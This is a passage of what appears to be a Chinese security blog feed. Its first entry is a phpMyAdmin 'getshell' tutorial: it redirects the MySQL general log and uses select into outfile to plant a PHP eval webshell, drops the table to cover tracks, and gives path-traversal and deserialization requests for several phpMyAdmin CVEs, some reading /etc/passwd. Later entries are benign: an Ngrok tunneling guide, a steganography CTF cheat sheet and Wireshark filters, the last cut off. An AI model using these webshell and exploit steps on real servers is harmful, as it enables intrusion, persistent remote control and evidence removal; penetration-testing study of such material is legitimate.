src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107131837034.png" alt="image-20210107131837034"></a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span>  general_log_file =<span class="string">&quot;/var/www/uploaded_images/1.php&quot;</span>;</span><br></pre></td></tr></table></figure><p>虽然会报错，但是再查看一遍，还是修改log成功了</p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107172623996.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107172623996.png" alt="image-20210107172623996"></a></p><p>这是再查询语句，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[&#x27;</span>a<span class="string">&#x27;]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>还是有报错，但是写进去了，写进去之后菜刀连</p><h2 id="新表getshell"><a href="#新表getshell" class="headerlink" title="新表getshell"></a>新表getshell</h2><p>成功的前提：可以执行select into outfile</p><h3 id="进入一个数据库，新建数据表"><a href="#进入一个数据库，新建数据表" class="headerlink" title="进入一个数据库，新建数据表"></a>进入一个数据库，新建数据表</h3><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210108102939227.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210108102939227.png" alt="image-20210108102939227"></a></p><p>添加字段xiaoma,字段类型TEXT</p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210108103256708.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210108103256708.png" alt="image-20210108103256708"></a></p><p>创建成功后，再该表中点击插入，值为一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[pwd]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210108103415015.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210108103415015.png" alt="image-20210108103415015"></a></p><h3 id="select-into-outfile写入-1"><a href="#select-into-outfile写入-1" class="headerlink" title="select into outfile写入"></a>select into outfile写入</h3><p>执行SQL查询，将该表中的内容导出到指定文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> shell_table <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&quot;/var/www/shell.php&quot;</span>;</span><br></pre></td></tr></table></figure><p>菜刀连好后，删除该表，清理痕迹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Drop</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> shell_table;</span><br></pre></td></tr></table></figure><p>以上步骤也可以通过MySQL语句执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">TABLE</span> shell_table (xiaoma <span class="built_in">text</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>) <span class="comment">-- 建表</span></span><br><span class="line"><span class="keyword">Insert</span> <span class="keyword">INTO</span> shell_table (xiaoma) <span class="keyword">VALUES</span>(<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);  <span class="comment">-- 写入</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> shell_table <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&#x27;/var/www/shell.php&#x27;</span>;   <span class="comment">-- 导出</span></span><br><span class="line"><span class="keyword">Drop</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> shell_table;    <span class="comment">-- 删表</span></span><br></pre></td></tr></table></figure><h1 id="特殊版本"><a href="#特殊版本" class="headerlink" title="特殊版本"></a>特殊版本</h1><h2 id="查看phpmyadmin版本"><a href="#查看phpmyadmin版本" class="headerlink" title="查看phpmyadmin版本"></a>查看phpmyadmin版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;readme</span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107133908544.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210107133908544.png" alt="image-20210107133908544"></a></p><h2 id="v2-x-反序列化漏洞任意文件读取"><a href="#v2-x-反序列化漏洞任意文件读取" class="headerlink" title="v2.x 反序列化漏洞任意文件读取"></a>v2.x 反序列化漏洞任意文件读取</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;scripts&#x2F;setup.php HTTP&#x2F;1.1</span><br><span class="line">Host: www.test.com</span><br><span class="line">Accept-Encoding: gzip, deflate Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded Content-Length: 80</span><br><span class="line"></span><br><span class="line">action&#x3D;test&amp;configuration&#x3D;O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;&#x2F;etc&#x2F;passwd&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="4-0-x-4-4-x-RCE-CVE-2016-5734"><a href="#4-0-x-4-4-x-RCE-CVE-2016-5734" class="headerlink" title="4.0.x/4.4.x RCE(CVE-2016-5734)"></a>4.0.x/4.4.x RCE(CVE-2016-5734)</h2><p><a href="https://www.exploit-db.com/exploits/40185">POC</a></p><p>条件：<br>phpMyAdmin版本：4.0.10.16之前4.0.x版本、4.4.15.7之前4.4.x版本；能登陆后台；PHP版本： 4.3.0-5.4.6</p><p>用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve<span class="number">-2016</span><span class="number">-5734.</span>py -c <span class="string">&#x27;system(id);&#x27;</span> -u root -p root -d test http://test.com</span><br></pre></td></tr></table></figure><p>注意：-c 指要执行的 php 代码</p><h2 id="4-8-1-文件包含漏洞-CVE-2018-12613"><a href="#4-8-1-文件包含漏洞-CVE-2018-12613" class="headerlink" title="4.8.1 文件包含漏洞(CVE-2018-12613)"></a>4.8.1 文件包含漏洞(CVE-2018-12613)</h2><h3 id="利用方式一"><a href="#利用方式一" class="headerlink" title="利用方式一"></a>利用方式一</h3><p>前提：能进管理页面</p><p>1、访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;index.php?target&#x3D;db_sql.php%3f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>2、执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo()?&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>3、查看自己的sessionid</p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210108104432490.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210108104432490.png" alt="image-20210108104432490"></a></p><p>4、把sessionid包含进去，即可getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;index.php?target&#x3D;db_sql.php%3f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_4u1jrl5dd5eshq332kto80bpp0qnmn0e</span><br></pre></td></tr></table></figure><h3 id="利用方式二"><a href="#利用方式二" class="headerlink" title="利用方式二"></a>利用方式二</h3><p>前提：能进管理页面，查询数据库绝对路径</p><p>1、select @@datadir;</p><p>2、创建数据库，插入一句话</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">test</span>(code <span class="built_in">varchar</span>(<span class="number">100</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">test</span>(code) <span class="keyword">VALUES</span>(<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>3、包含该数据库文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;software&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;MySQL5.7.26&#x2F;data&#x2F;test&#x2F;test.MYD</span><br></pre></td></tr></table></figure><h2 id="4-0-1–4-2-12-任意文件包含-CVE-2014-8959"><a href="#4-0-1–4-2-12-任意文件包含-CVE-2014-8959" class="headerlink" title="4.0.1–4.2.12 任意文件包含(CVE-2014-8959)"></a>4.0.1–4.2.12 任意文件包含(CVE-2014-8959)</h2><p>前提：能进管理页面；PHP版本 &lt; 5.3.4(00截断)；已知网站绝对路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;gis_data_editor.php?token&#x3D;你的token值&amp;gis_data[gis_type]&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;phpinfo.txt%00</span><br></pre></td></tr></table></figure><p>可找上传点上传图片马等文件 getshell</p><h2 id="4-8-0–4-8-3-任意文件包含-RCE-CVE-2018-19968"><a href="#4-8-0–4-8-3-任意文件包含-RCE-CVE-2018-19968" class="headerlink" title="4.8.0–4.8.3 任意文件包含/RCE(CVE-2018-19968)"></a>4.8.0–4.8.3 任意文件包含/RCE(CVE-2018-19968)</h2><p>1、登录后台，创建数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test.bar ( baz <span class="built_in">VARCHAR</span>(<span class="number">100</span>) PRIMARY <span class="keyword">KEY</span> );</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test.bar <span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>2、访问 <code>http://test.com/chk_rel.php?fixall_pmadb=1&amp;db=test</code> 页面</p><p>3、查看 COOKIE 中 phpMyAdmin 的值</p><p><a href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210108105021014.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210108105021014.png" alt="image-20210108105021014"></a></p><p>4、将表 pma__columninfo 中将 <code>sess_</code> 后面的数字替换成你刚刚查找的 phpMyAdmin 值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO pma__column_info SELECT &#39;1&#39;, &#39;test&#39;, &#39;bar&#39;, &#39;baz&#39;, &#39;plop&#39;, &#39;plop&#39;, &#39;plop&#39;, &#39;plop&#39;, &#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_5459575785b3388d23cce3644f2c482f&#39;,&#39;plop&#39;;</span><br><span class="line"># 注意，这里的 sess_5459575785b3388d23cce3644f2c482f 文件需要改成自己对应的文件</span><br></pre></td></tr></table></figure><p>4、访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;tbl_replace.php?db&#x3D;test&amp;table&#x3D;bar&amp;where_clause&#x3D;1&#x3D;1&amp;fields_name[multi_edit][][]&#x3D;baz&amp;clause_is_unique&#x3D;1</span><br></pre></td></tr></table></figure><p>即可看到恶意代码已被包含</p><h2 id="3-5-x-3-5-8-1-4-0-0-4-0-0-rc3-CVE-2013-3238"><a href="#3-5-x-3-5-8-1-4-0-0-4-0-0-rc3-CVE-2013-3238" class="headerlink" title="3.5.x-3.5.8.1 | 4.0.0-4.0.0-rc3 (CVE-2013-3238)"></a>3.5.x-3.5.8.1 | 4.0.0-4.0.0-rc3 (CVE-2013-3238)</h2><blockquote><p>影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG</p><p>利用模块：exploit/multi/http/phpmyadminpregreplace</p></blockquote><h2 id="v3-5-2-2-CVE-2012-5159"><a href="#v3-5-2-2-CVE-2012-5159" class="headerlink" title="v3.5.2.2 (CVE-2012-5159)"></a>v3.5.2.2 (CVE-2012-5159)</h2><blockquote><p>影响版本：phpMyAdmin v3.5.2.2</p><p>利用模块：exploit/multi/http/phpmyadmin3522_backdoor</p></blockquote><h2 id="2-11-x-2-11-9-5-3-x-3-1-3-1-CVE-2009-1151"><a href="#2-11-x-2-11-9-5-3-x-3-1-3-1-CVE-2009-1151" class="headerlink" title="2.11.x-2.11.9.5 | 3.x-3.1.3.1 (CVE-2009-1151)"></a>2.11.x-2.11.9.5 | 3.x-3.1.3.1 (CVE-2009-1151)</h2><p>PhpMyAdmin配置文件/config/config.inc.php存在命令执行</p><blockquote><p>影响版本：2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1</p><p>利用模块：exploit/unix/webapp/phpmyadmin_config</p></blockquote><h1 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h1><ul><li>登录phpmyadmin不是用的root，且root不能登录，普通用户权限的限制很大，load_file不行，select into outfile更不行，日志也不能开启写入，权限太低的时候不建议太执着于写shell进去，能得到网站的根路径和phpmyadmin的版本，看有没有版本漏洞。</li><li>一旦获取到了root权限，可以轻松自如操作数据库，在配置文件中[mysqld]下添加skip-grant-tables，跳过认证密码这一步，在user数据库中将host改为 <code>%</code> 就能远程登录。</li><li>写shell的方式有很多：选择有操作权限的位置插入木马，日志修改，直接数据库语句新建新表再插入木马，再导出到网站目录下。</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.freebuf.com/articles/web/226240.html">https://www.freebuf.com/articles/web/226240.html</a></p><p><a href="https://www.cnblogs.com/wjrblogs/p/13453359.html">https://www.cnblogs.com/wjrblogs/p/13453359.html</a></p><p><a href="https://xz.aliyun.com/t/3283">https://xz.aliyun.com/t/3283</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ngrok实现内网映射与穿透</title>
      <link href="2023/11/28/Ngrok%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%98%A0%E5%B0%84%E4%B8%8E%E7%A9%BF%E9%80%8F/"/>
      <url>2023/11/28/Ngrok%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%98%A0%E5%B0%84%E4%B8%8E%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本想说用博客实现一个提供下载文件夹的功能，尝试了一下，貌似只能下载图片、pdf这类的文件，并不能实现大文件的传输，且效率也十分低下，所以想到了可以将内网映射出一个公网ip或域名实现快速访问下载的功能。</p><h2 id="Ngrok实现操作"><a href="#Ngrok实现操作" class="headerlink" title="Ngrok实现操作"></a>Ngrok实现操作</h2><p>内网穿透工具也非常多，我个人比较喜欢Sunny-Ngrok</p><p><a href="https://ngrok.cc/">Ngrok官网</a>也有详细的使用教程</p><p>为了提供我之前想实现的文件传输工作，首先我要先把自己的文件建在内网服务器上，这个办法可以是PHPstudy，或者用python，内网渗透的时候经常会用到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">8000</span></span><br></pre></td></tr></table></figure><p>我为了省事，放在phpstudy下</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225155139990.png" alt="image-20210225155139990"></p><p>只需访问<a href="http://127.0.0.1/doc/kxsw.zip">http://127.0.0.1/doc/kxsw.zip</a> 即可实现下载</p><p>所以要把这个IP映射到公网上</p><p>而我自己的ip是 192.168.1.92</p><p>在Ngrok.cc上注册账号</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225155623319.png" alt="image-20210225155623319"></p><p>选择免费的</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225155653769.png" alt="image-20210225155653769"></p><p>填写相关信息，后面两个验证可以先不写</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225160627738.png" alt="image-20210225160627738"></p><p>添加成功后，已经看到赠送给自己的域名了，通过域名可以实现内网穿透了</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225160702896.png" alt="image-20210225160702896"></p><p>点击客户端下载，选择需要的版本</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225160112584.png" alt="image-20210225160112584"></p><p>启动客户端，输入id后 回车</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225160850025.png" alt="image-20210225160850025"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225160937644.png" alt="image-20210225160937644"></p><p>可以看到已经在映射了，那个域名就相当于本地ip:80 </p><p>所以现在下载我想下载的那个文件</p><p>之前是： <a href="http://127.0.0.1/doc/kxsw.zip">http://127.0.0.1/doc/kxsw.zip</a></p><p>现在则是: http://域名/doc/kxsw.zip</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225161407233.png" alt="image-20210225161407233"></p><p>已经在下载了，说明内网穿透成功！</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_39190897/article/details/108831358">https://blog.csdn.net/weixin_39190897/article/details/108831358</a></p><p>其他比较好的穿透工具教程：</p><p><a href="https://jasonkayzk.github.io/2020/09/02/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/">win10内网穿透实现远程桌面连接</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc总结之图片隐写</title>
      <link href="2023/11/28/Misc%E6%80%BB%E7%BB%93%E4%B9%8B%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
      <url>2023/11/28/Misc%E6%80%BB%E7%BB%93%E4%B9%8B%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="MISC简介"><a href="#MISC简介" class="headerlink" title="MISC简介"></a>MISC简介</h2><p><strong>Misc</strong>为英文miscellaneous的前四个字母，是<code>杂项</code>、<code>混合体</code>、<code>大杂烩</code>的意思</p><p>主要类型有</p><ul><li>数据编码、图形编码</li><li>图片隐写</li><li>音频、视频隐写</li><li>流量分析</li><li>内存取证</li><li>游戏隐写</li></ul><h2 id="图片隐写分类"><a href="#图片隐写分类" class="headerlink" title="图片隐写分类"></a>图片隐写分类</h2><h3 id="右击属性"><a href="#右击属性" class="headerlink" title="右击属性"></a>右击属性</h3><p>属性————详细信息 中可能会隐藏一些字符串信息</p><h3 id="文件中藏字符串"><a href="#文件中藏字符串" class="headerlink" title="文件中藏字符串"></a>文件中藏字符串</h3><ul><li>strings可直接查看</li><li>grep -a “ctf” grep.jpeg</li><li>file识别文件类型</li></ul><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><ul><li>binwalk -e file 分离文件</li><li>foremost file 提取文件</li><li>dd if=file of=outfile bs=1 skip=开始分离的数字位置</li></ul><h3 id="修改文件头"><a href="#修改文件头" class="headerlink" title="修改文件头"></a>修改文件头</h3><ul><li>JPEG (jpg)，<br>文件头：FFD8FF<br>文件尾：FF D9</li><li>PNG (png)，<br>文件头：89504E47<br>文件尾：AE 42 60 82</li><li>GIF (gif)， 　　<br>文件头：47494638 或GIF89A　　　　　　　　　　　　　　　　　　　<br>文件尾：00 3B</li><li>ZIP Archive (zip)，<br>文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　<br>文件尾：50 4B</li></ul><p>// 以下不太常见，但也要知道呀</p><ul><li>HTML (html)，<br>文件头：68746D6C3E</li><li>Wave (wav)，<br>文件头：57415645</li><li>AVI (avi)，<br>文件头：41564920</li><li>bmp， 　<br>文件头：424D</li><li>Email [thorough only] (eml)，<br>文件头：44656C69766572792D646174653A</li><li>Adobe Acrobat (pdf)，<br>文件头：255044462D312E</li><li>RAR Archive (rar)，<br>文件头：52617221</li><li>Photoshop (psd)，<br>文件头：38425053</li><li>XML (xml)，<br>文件头：3C3F786D6C</li></ul><h3 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h3><ul><li>特殊帧（ps/stegsolve）</li><li>帧的时间间隔（看出0101010类型编码）</li></ul><h3 id="png（bmp）"><a href="#png（bmp）" class="headerlink" title="png（bmp）"></a>png（bmp）</h3><ul><li><p>zilb(010/pngcheck)</p></li><li><p>IHDR、IDAT</p></li><li><p>lsb隐写/lsb加密（zsteg/stegsolve）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 lsb.py extract lsb(<span class="number">123456</span>).png misc <span class="number">123456</span></span><br></pre></td></tr></table></figure></li><li><p>wbs43open(bmp)</p></li></ul><h3 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a>jpg</h3><ul><li><p><strong>jphide(jphs)</strong></p></li><li><p><strong>steghide</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf file.jpg -p 123456</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>stegdetect</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stegdetect.exe -tjopi -s1000.0 \*.jpg (查看图片隐写方式)</span><br><span class="line"></span><br><span class="line">stegbreak -r rules.ini -f password.txt -t p *.jpg（爆破密码）</span><br></pre></td></tr></table></figure></li><li><p><strong>outguess</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k &quot;key&quot; -r 文件名 -t 保存的文件名</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>F5-steganography</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- java Extract F5.jpg -e misc -p 11111</span><br></pre></td></tr></table></figure></li><li><p><strong>水印(单图)(工具+Java盲水印)</strong></p></li></ul><h3 id="双图隐写"><a href="#双图隐写" class="headerlink" title="双图隐写"></a>双图隐写</h3><h3 id="stegpy"><a href="#stegpy" class="headerlink" title="stegpy"></a>stegpy</h3><h3 id="silenteye"><a href="#silenteye" class="headerlink" title="silenteye"></a>silenteye</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1、<a href="https://blog.csdn.net/q20010619/article/details/109224105">https://blog.csdn.net/q20010619/article/details/109224105</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc总结之流量分析</title>
      <link href="2023/11/28/Misc%E6%80%BB%E7%BB%93%E4%B9%8B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>2023/11/28/Misc%E6%80%BB%E7%BB%93%E4%B9%8B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="MISC简介"><a href="#MISC简介" class="headerlink" title="MISC简介"></a>MISC简介</h2><p><strong>Misc</strong>为英文miscellaneous的前四个字母，是<code>杂项</code>、<code>混合体</code>、<code>大杂烩</code>的意思</p><p>主要类型有</p><ul><li>数据编码、图形编码</li><li>图片隐写</li><li>音频、视频隐写</li><li>流量分析</li><li>内存取证</li><li>游戏隐写</li></ul><h2 id="主要工具"><a href="#主要工具" class="headerlink" title="主要工具"></a>主要工具</h2><p><code>wireshark</code></p><p>语法使用：</p><p>查找包含指定页面的流量包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http and http.request.uri contains &quot;index.html&quot;</span><br></pre></td></tr></table></figure><blockquote><p>HTTPS使用了TLS加密协议，抓包也看不到内容</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oicq    # QQ的协议</span><br></pre></td></tr></table></figure><h3 id="wireshark使用语法"><a href="#wireshark使用语法" class="headerlink" title="wireshark使用语法"></a>wireshark使用语法</h3><p>1.过滤IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip.src eq 192.168.1.10 or ip.dst eq 192.168.1.10</span><br><span class="line">ip.addr eq 192.168.1.10   # 都显示：来源和目标</span><br></pre></td></tr></table></figure><p>2.过滤端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcp.port eq 80 or udp.port eq 80    # 来源+目标</span><br><span class="line">tcp.dstport &#x3D;&#x3D; 80   # 只显示tcp协议的目标端口</span><br><span class="line">tcp.srcport &#x3D;&#x3D; 80   # 只显示tcp协议的来源端口 </span><br><span class="line">tcp.port &gt;&#x3D; 1 and tcp.port &lt;&#x3D; 80   # 端口范围</span><br></pre></td></tr></table></figure><p>3.过滤协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcp  udp  icmp  http  smtp  ftp  dns  msnms  ip  ssloicq  bootp 等</span><br><span class="line">！udp 或者 not udp</span><br></pre></td></tr></table></figure><p>4.过滤指定字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http.request.uri matches &quot;.mp3$&quot;  # http请求的uri中以.mp3结尾</span><br><span class="line">http.request.uri contains &quot;.mp3$&quot;   # 包含.mp3$这5个字节的uri请求，$是字符不是正则表达式的结尾</span><br></pre></td></tr></table></figure><p>5.http模式过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http.request.method &#x3D;&#x3D; &quot;GET&quot;</span><br><span class="line">http.request.uri &#x3D;&#x3D; &quot;&#x2F;img&#x2F;logo.gif&quot;</span><br><span class="line">http contains &quot;GET&quot;</span><br><span class="line">http contains &quot;HTTP&#x2F;1.1 200 OK&quot;</span><br><span class="line">http.request.method &#x3D;&#x3D; &quot;POST&quot; &amp;&amp; http contains &quot;User-Agent:&quot; 